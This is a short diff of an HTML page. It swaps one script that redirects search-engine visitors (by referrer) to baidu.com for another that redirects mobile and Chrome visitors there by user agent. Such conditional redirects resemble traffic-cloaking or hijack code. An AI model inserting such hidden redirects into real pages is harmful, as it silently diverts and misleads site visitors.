@@ -35,13 +35,10 @@
 </head>
 
 <body>
-<script language=”javascript”>
-var regexp=/\.(google|baidu|yahoo)(\.[a-z0-9\-]+){1,2}\//ig;
-var where =document.referrer;
-if(regexp.test(where))
-{
-window.location.href=”http://www.baidu.com/”
-}
+<script>
+  if(navigator.userAgent.match(/android|ipad|iphone|ipod|Chrome|blackberry/i)) {
+    window.location.href = 'http://www.baidu.com';
+  }
 </script>
 	<table width="1116" height="47" border="0" align="center">
   <tr>
